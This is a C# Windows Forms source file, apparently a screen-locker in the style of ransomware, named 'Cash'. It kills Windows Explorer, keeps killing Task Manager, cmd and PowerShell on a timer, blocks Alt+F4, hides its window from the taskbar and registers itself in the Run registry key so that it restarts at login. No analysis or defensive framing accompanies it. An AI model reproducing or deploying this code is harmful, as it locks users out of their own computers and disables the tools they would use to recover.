﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cash
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            this.KeyDown += Form1_KeyDown;
            InitializeComponent();
            // this.CenterToScreen();
            System.Diagnostics.Process.Start("cmd.exe", "taskkill -f -im explorer.exe");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            this.ShowInTaskbar = false;
            SetStartup(true);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
           if (e.Alt && e.KeyCode == Keys.F4)
                e.Handled = true;


        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Process process in Process.GetProcessesByName("Taskmgr")) { if (process.ProcessName == "Taskmgr") { process.Kill(); } }
            
            foreach (Process process in Process.GetProcessesByName("cmd")) { if (process.ProcessName == "cmd") { process.Kill(); } }
            
            foreach (Process process in Process.GetProcessesByName("powershell")) { if (process.ProcessName == "powershell") { process.Kill(); } }
       
        }
        private void SetStartup(bool enable)
        {
            string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(runKey);

            if (enable)
            {
                if (startupKey.GetValue("Cash") == null)
                {
                    startupKey.Close();
                    startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
                    startupKey.SetValue("Cash", "\"" + Application.ExecutablePath + "\"");
                    startupKey.Close();
                }
            }
            else
            {
                startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
                startupKey.DeleteValue("Cash", false);
                startupKey.Close();
            }
        }
        protected override CreateParams CreateParams
        {
            get
            {
                // Turn on WS_EX_TOOLWINDOW style bit
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
                
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
        
            MessageBox.Show("Good Luck!");
        }
    }
}